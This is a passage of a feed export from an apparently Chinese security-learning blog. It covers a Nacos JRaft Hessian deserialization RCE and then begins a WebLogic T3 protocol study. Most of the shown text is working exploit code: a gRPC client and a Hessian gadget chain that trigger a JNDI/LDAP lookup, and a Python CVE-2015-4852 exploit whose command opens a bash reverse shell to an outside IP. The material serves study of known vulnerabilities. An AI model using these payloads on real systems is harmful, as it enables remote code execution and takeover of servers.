class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æœ€åå¯ä»¥å†™å‡ºä¸‹é¢çš„å®¢æˆ·ç«¯ï¼Œç›´æ¥copyæ–‡ç« çš„ï¼Œç„¶åè®©dsç»™æˆ‘åŠ äº†äº›æ³¨é‡Šï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ==================== åˆå§‹åŒ–é…ç½® ====================</span><br>        <span class="hljs-comment">// ç›®æ ‡ Raft é›†ç¾¤ Leader èŠ‚ç‚¹åœ°å€ï¼ˆæ ¼å¼ï¼šIP:Portï¼‰</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1:7848&quot;</span>;<br>        <span class="hljs-comment">// æ„é€ å¾…å‘é€çš„ä¸šåŠ¡æ•°æ®ï¼ˆç¤ºä¾‹ä¸ºç©ºæ•°æ®ï¼Œå®é™…åº”ä¸ºåºåˆ—åŒ–åçš„æœ‰æ•ˆè´Ÿè½½ï¼‰</span><br>        <span class="hljs-type">byte</span>[] poc = Poc.getPoc();<br><span class="hljs-comment">//        byte[] poc = &quot;hello&quot;.getBytes();</span><br><br>        <span class="hljs-comment">// ==================== åˆå§‹åŒ– JRaft å®¢æˆ·ç«¯æœåŠ¡ ====================</span><br>        <span class="hljs-comment">// åˆ›å»º JRaft å®¢æˆ·ç«¯æœåŠ¡å®ä¾‹ï¼ˆç”¨äºä¸ Raft é›†ç¾¤é€šä¿¡ï¼‰</span><br>        <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        <span class="hljs-comment">// åˆå§‹åŒ–å®¢æˆ·ç«¯æœåŠ¡ï¼ˆä½¿ç”¨é»˜è®¤é…ç½®ï¼‰</span><br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br><br>        <span class="hljs-comment">// ==================== æ„å»ºè¯·æ±‚ç›®æ ‡ ====================</span><br>        <span class="hljs-comment">// è§£æ Leader èŠ‚ç‚¹åœ°å€ä¿¡æ¯ï¼ˆPeerId åŒ…å«èŠ‚ç‚¹ IP å’Œ Portï¼‰</span><br>        <span class="hljs-type">PeerId</span> <span class="hljs-variable">leader</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br><br>        <span class="hljs-comment">// ==================== æ„é€ ä¸šåŠ¡è¯·æ±‚ ====================</span><br>        <span class="hljs-comment">// åˆ›å»º Nacos çš„ WriteRequest è¯·æ±‚ï¼ˆä½¿ç”¨ Protobuf æ„å»ºï¼‰</span><br>        <span class="hljs-type">WriteRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder()<br><span class="hljs-comment">//                .setGroup(&quot;naming_persistent_service_v2&quot;) // Nacos çš„æŒä¹…åŒ–æœåŠ¡ç»„å</span><br>                .setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>)<br><span class="hljs-comment">//                .setGroup(&quot;naming_instance_metadata&quot;)</span><br>                .setData(ByteString.copyFrom(poc))         <span class="hljs-comment">// ä¸šåŠ¡æ•°æ®ï¼ˆéœ€æŒ‰ Nacos æ ¼å¼åºåˆ—åŒ–ï¼‰</span><br>                .build();<br><br>        <span class="hljs-comment">// ==================== è·å–åº•å±‚ RPC å®¢æˆ·ç«¯ ====================</span><br>        <span class="hljs-comment">// è·å– JRaft çš„ gRPC å®¢æˆ·ç«¯å®ä¾‹ï¼ˆå®é™…é€šä¿¡å¤„ç†å™¨ï¼‰</span><br>        <span class="hljs-type">GrpcClient</span> <span class="hljs-variable">grpcClient</span> <span class="hljs-operator">=</span> (GrpcClient) cliClientService.getRpcClient();<br><br>        <span class="hljs-comment">// ==================== åå°„æ³¨å…¥è‡ªå®šä¹‰è¯·æ±‚ç±»å‹ ====================</span><br>        <span class="hljs-comment">// å…³é”®æ­¥éª¤ï¼šç”±äº WriteRequest æ˜¯ Nacos è‡ªå®šä¹‰ç±»å‹ï¼Œéœ€æ‰‹åŠ¨æ³¨å†Œåˆ° JRaft çš„è§£æå™¨</span><br><br>        <span class="hljs-comment">// åå°„è·å– GrpcClient å†…éƒ¨çš„åè®®è§£æå™¨æ˜ å°„è¡¨ï¼ˆparserClassesï¼‰</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClassesField</span> <span class="hljs-operator">=</span> GrpcClient.class.getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClassesField.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">// çªç ´ç§æœ‰è®¿é—®é™åˆ¶</span><br>        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);<br><br>        <span class="hljs-comment">// æ³¨å†Œ WriteRequest ç±»å‹åˆ°è§£æå™¨ï¼ˆä½¿ JRaft èƒ½è¯†åˆ«è¯¥ Protobuf ç±»å‹ï¼‰</span><br>        parserClasses.put(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br>        <span class="hljs-comment">// æ³¨å†Œå“åº”ç±»å‹è§£æå™¨ï¼ˆç”¨äºååºåˆ—åŒ–æœåŠ¡ç«¯å“åº”ï¼‰</span><br>        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-comment">// ==================== å‘é€è¯·æ±‚å¹¶è·å–å“åº” ====================</span><br>        <span class="hljs-comment">// åŒæ­¥å‘é€è¯·æ±‚åˆ° Leader èŠ‚ç‚¹ï¼ˆå‚æ•°è¯´æ˜ï¼šèŠ‚ç‚¹åœ°å€ï¼Œè¯·æ±‚å¯¹è±¡ï¼Œè¶…æ—¶æ—¶é—´ 5000msï¼‰</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> grpcClient.invokeSync(leader.getEndpoint(), request, <span class="hljs-number">5000</span>);<br><br>        <span class="hljs-comment">// æ‰“å°å“åº”ç»“æœï¼ˆå®é™…åº”æ ¹æ®ä¸šåŠ¡å¤„ç†å“åº”ï¼‰</span><br>        System.out.println(<span class="hljs-string">&quot;Received response: &quot;</span> + res);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å…ˆéšä¾¿å‘ä¸€ç‚¹æ•°æ®è¿‡å»ï¼Œç›®çš„æ˜¯çœ‹ä¸€ä¸‹è°ƒç”¨å †æ ˆï¼Œçœ‹çœ‹æ˜¯æ€ä¹ˆèµ°åˆ°ååºåˆ—åŒ–çš„åœ°æ–¹çš„</p><p><img src="https://cdn.clown2024.cn/image-20250330223652775.png" alt="image-20250330223652775"></p><p>è¿™é‡Œè°ƒç”¨å †æ ˆå°±å¾ˆæ¸…æ™°äº†ï¼Œå°±ä¸è¿‡å¤šè§£é‡Šäº†</p><h2 id="gadgetæ„é€ "><a href="#gadgetæ„é€ " class="headerlink" title="gadgetæ„é€ "></a>gadgetæ„é€ </h2><p>è¿™é‡ŒæŒ‘ä¸€æ¡é“¾å­æ‰“ï¼Œé‡‡ç”¨y4å¸ˆå‚…é‡Œçš„ï¼Œæ‰“SwingLazyValueçš„é“¾å­ï¼Œä½†æ˜¯è¿™é‡Œç¯å¢ƒç”¨çš„nacos2.2.2ç‰ˆæœ¬ç”¨çš„hessian-4.0.63.jarï¼Œè¯¥ç‰ˆæœ¬çš„jaræœ‰å†…ç½®çš„é»‘åå•</p><p>y4å¸ˆå‚…è¿™é‡Œé‡‡ç”¨çš„æ˜¯jndié…åˆjacksonæ¥æ‰“ï¼Œå› ä¸ºnacosæ˜¯springbootï¼Œå†…ç½®äº†jackson</p><p>å‰åŠéƒ¨åˆ†å°±ç”¨HashMapæ¥è§¦å‘UIDefaults.get()</p><p>è¿™é‡Œå†™å‡ºçš„pocç±»å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getPoc() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/Y2FsYw==&quot;</span>&#125;);<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> makeMap(u1, u2);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        output.writeObject(map);<br>        output.flush();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-comment">// æ„é€ å“ˆå¸Œç›¸ç­‰</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå‰é¢çš„å®¢æˆ·ç«¯ä»£ç åªè¦æ”¹ä¸€ä¸‹ï¼Œè°ƒç”¨getPocå°±å¯ä»¥è·å–payloadçš„å­—èŠ‚æ•°ç»„äº†</p><p>ç„¶åè¿™é‡Œç”¨X1r0zå¸ˆå‚…çš„jndimapå·¥å…·æ¥èµ·ä¸€ä¸ªç›‘å¬</p><p><img src="https://cdn.clown2024.cn/image-20250330234321716.png" alt="image-20250330234321716"></p><p>å› ä¸ºè¿™é‡Œnacosåœ¨dockeré‡Œé¢ï¼Œæ‰€ä»¥ç”¨curlæ¥è¿›è¡ŒéªŒè¯</p><p>emmmä½†æ˜¯å¾ˆæ€ªï¼Œæ²¡æ‰“é€šï¼Œè¿”å›äº†ä¸€ä¸ªæŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/image-20250331000847488.png" alt="image-20250331000847488"></p><p>ä¸è¿‡æ‰“jndiå°±è¦æ±‚ç¯å¢ƒéœ€è¦å‡ºç½‘</p><h2 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h2><p>è¿™é‡Œçš„payloadåªèƒ½æ‰“ä¸€æ¬¡ï¼Œå¦‚æœæ‰“ç¬¬äºŒæ¬¡å°±ä¼šå‘ç”Ÿ</p><p><img src="https://cdn.clown2024.cn/image-20250330235541466.png" alt="image-20250330235541466"></p><p>è°ƒè¯•çš„æ—¶å€™ä»–ä¹Ÿä¸ä¼šè¿›å…¥onApplyå‡½æ•°çš„æ–­ç‚¹äº†</p><p>éœ€è¦é”€æ¯ç¯å¢ƒé‡å»ºæ‰è¡Œï¼Œä¸è¿‡è¿™é‡Œnacosä¸æ­¢ä¸€ä¸ªRaftGroupService</p><p>è‡³å°‘æœ‰ä¸‰ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">naming_persistent_service_v2<br>naming_instance_metadata<br>naming_service_metadata<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250330235723916.png" alt="image-20250330235723916"></p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™æ ·è®¾ç½®æ‰“ä¸‰æ¬¡</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="http://blog.csdn.net/baidu_25299117/article/details/140476392">http://blog.csdn.net/baidu_25299117/article/details/140476392</a></p><p><a href="https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing">https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing</a></p><p><a href="https://y4er.com/posts/nacos-hessian-rce/">https://y4er.com/posts/nacos-hessian-rce/</a></p><p>è¿˜æœ‰å…¶ä»–çš„é“¾å­å¯ä»¥çœ‹X1r0zå¸ˆå‚…çš„åšå®¢ï¼š<a href="https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/">https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ€è¿‘åœ¨çœ‹Javaå¾®æœåŠ¡ç›¸å…³çš„çŸ¥è¯†ï¼Œé‚£å°±é¡ºä¾¿å­¦ä¸€ä¸‹Nacosç›¸å…³çš„æ¼æ´&lt;/p&gt;
&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>WebLogicå­¦ä¹ </title>
    <link href="https://clowsman.github.io/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-27T11:22:37.000Z</published>
    <updated>2025-04-10T15:24:20.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>å®˜æ–¹ä»‹ç»ï¼šOracle WebLogic Server æ˜¯ä¸€ä¸ªç»Ÿä¸€çš„å¯æ‰©å±•å¹³å°ï¼Œä¸“ç”¨äºå¼€å‘ã€éƒ¨ç½²å’Œè¿è¡Œ Java åº”ç”¨ç­‰é€‚ç”¨äºæœ¬åœ°ç¯å¢ƒå’Œäº‘ç¯å¢ƒçš„ä¼ä¸šåº”ç”¨ã€‚å®ƒæä¾›äº†ä¸€ç§å¼ºå¥ã€æˆç†Ÿå’Œå¯æ‰©å±•çš„ Java Enterprise Edition (EE) å’Œ Jakarta EE å®æ–½æ–¹å¼ã€‚ç±»ä¼¼äºTomcatã€Jbossç­‰ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>weblogicå®‰è£…åœ°å€ï¼š<a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></p><p>è¾ƒè€çš„ç‰ˆæœ¬æ¯”å¦‚weblogic10åœ¨è¿™é‡Œæ‰¾ï¼š<a href="https://edelivery.oracle.com/osdc/faces/SoftwareDelivery">https://edelivery.oracle.com/osdc/faces/SoftwareDelivery</a></p><p>jdkå®‰è£…åœ°å€ï¼š<a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></p><p>æœ‰å…³WebLogicçš„åŸºç¡€çŸ¥è¯†å¯ä»¥çœ‹ï¼š<a href="https://paper.seebug.org/1012/%EF%BC%8C%E8%AF%B4%E7%9A%84%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%EF%BC%8C%E8%BF%99%E4%B9%9F%E6%98%AF%E4%B8%8A%E9%9D%A2docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E4%BD%9C%E8%80%85">https://paper.seebug.org/1012/ï¼Œè¯´çš„éå¸¸è¯¦ç»†ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢dockerç¯å¢ƒæ­å»ºçš„ä½œè€…</a></p><p>å¾ˆéš¾å—ï¼Œæ‰¾ä¸åˆ°weblogic 10.3.6.0çš„ç‰ˆæœ¬äº†ï¼Œæ„Ÿè§‰éƒ½å’Œæ–‡ç« æåˆ°çš„æ–‡ä»¶ä¸ä¸€æ ·ï¼Œé‚£å°±åªèƒ½èµ·ä¸€ä¸ªvulhubçš„weblogicç¯å¢ƒï¼Œç›´æ¥ä»é‡Œé¢æŠŠweblogicçš„æ–‡ä»¶æ‹‰å‡ºæ¥ç„¶åè°ƒè¯•äº†ï¼Œæ‰€ä»¥ä¸åŒç‰ˆæœ¬çš„è°ƒè¯•ç¯å¢ƒæ­å»ºå…ˆä¸åœ¨è¿™é‡Œå†™äº†ï¼Œç­‰ä¼šå…·ä½“åˆ†æå†å†™</p><h1 id="t3åè®®åˆ†æ"><a href="#T3åè®®åˆ†æ" class="headerlink" title="T3åè®®åˆ†æ"></a>T3åè®®åˆ†æ</h1><p>è¿™é‡Œç›´æ¥ç”¨çš„CVE-2015-4852çš„expæ¥å¯¹æ”»å‡»æµé‡è¿›è¡Œåˆ†ææ¥å¤ç°ï¼Œç”¨çš„weblogicç‰ˆæœ¬æ˜¯10.3.6.0</p><h2 id="t3åè®®ä»‹ç»"><a href="#T3åè®®ä»‹ç»" class="headerlink" title="T3åè®®ä»‹ç»"></a>T3åè®®ä»‹ç»</h2><p>T3 åè®®æ˜¯ Weblogic RMI è°ƒç”¨æ—¶çš„é€šä¿¡åè®®</p><p>RMI å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥è¿œç¨‹è°ƒç”¨å¦ä¸€å° JVMè™šæ‹Ÿæœºä¸­å¯¹è±¡ä¸Šçš„æ–¹æ³•ï¼Œä¸”æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯åºåˆ—åŒ–è¿›è¡Œä¼ è¾“çš„</p><p>Java RMI çš„åŸºç¡€é€šä¿¡åè®®æ˜¯ JRMP ï¼Œä½†æ˜¯ä¹Ÿæ”¯æŒå¼€å‘å…¶ä»–çš„åè®®æ¥ä¼˜åŒ– RMI çš„ä¼ è¾“ï¼Œè¿™é‡Œçš„ Weblogic çš„ T3 åè®®å°±æ˜¯å…¶ä¼˜åŒ–ç‰ˆæœ¬ï¼Œç›¸æ¯”äºJRMPåè®®å¤šäº†ä¸€äº›ç‰¹æ€§ã€‚ä»¥ä¸‹æ˜¯T3åè®®çš„ç‰¹ç‚¹ï¼š</p><ol><li>æœåŠ¡ç«¯å¯ä»¥æŒç»­è¿½è¸ªç›‘æ§å®¢æˆ·ç«¯æ˜¯å¦å­˜æ´»ï¼ˆå¿ƒè·³æœºåˆ¶ï¼‰ï¼Œé€šå¸¸å¿ƒè·³çš„é—´éš”ä¸º60ç§’ï¼ŒæœåŠ¡ç«¯åœ¨è¶…è¿‡240ç§’æœªæ”¶åˆ°å¿ƒè·³å³åˆ¤å®šä¸å®¢æˆ·ç«¯çš„è¿æ¥ä¸¢å¤±ã€‚</li><li>é€šè¿‡å»ºç«‹ä¸€æ¬¡è¿æ¥å¯ä»¥å°†å…¨éƒ¨æ•°æ®åŒ…ä¼ è¾“å®Œæˆï¼Œä¼˜åŒ–äº†æ•°æ®åŒ…å¤§å°å’Œç½‘ç»œæ¶ˆè€—ã€‚</li></ol><h2 id="åè®®åˆ†æ"><a href="#åè®®åˆ†æ" class="headerlink" title="åè®®åˆ†æ"></a>åè®®åˆ†æ</h2><p>é¦–å…ˆæ˜¯CVE-2015-4852çš„exp</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload1</span>(<span class="hljs-params">gadget, command</span>):<br>    JAR_FILE = <span class="hljs-string">&#x27;ysoserial-all.jar&#x27;</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload2</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port, payload</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, port))<br><br>    handshake = <span class="hljs-string">&quot;t3 10.3.1\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()<br>    sock.sendall(handshake)<br><br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;HELO:(.*).false&quot;</span>)<br>    version = re.findall(pattern, data.decode())<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(version) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(version[<span class="hljs-number">0</span>]))<br>    data_len = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>) <span class="hljs-comment">#æ•°æ®åŒ…é•¿åº¦ï¼Œå…ˆå ä½ï¼Œåé¢ä¼šæ ¹æ®å®é™…æƒ…å†µé‡æ–°</span><br>    t3header = binascii.a2b_hex(<span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="hljs-comment">#t3åè®®å¤´</span><br>    flag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>) <span class="hljs-comment">#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</span><br>    payload = data_len + t3header + flag + payload<br>    payload = struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:] <span class="hljs-comment">#é‡æ–°è®¡ç®—æ•°æ®åŒ…é•¿åº¦ï¼Œå°†payloadçš„é•¿åº¦è½¬æ¢ä¸ºå¤§ç«¯æ¨¡å¼å†™å…¥</span><br>    sock.send(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span> <span class="hljs-comment">#CommonsCollections1 Jdk7u21</span><br>    command = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/172.24.120.203/8888 0&gt;&amp;1&quot;</span><br><br>    payload = 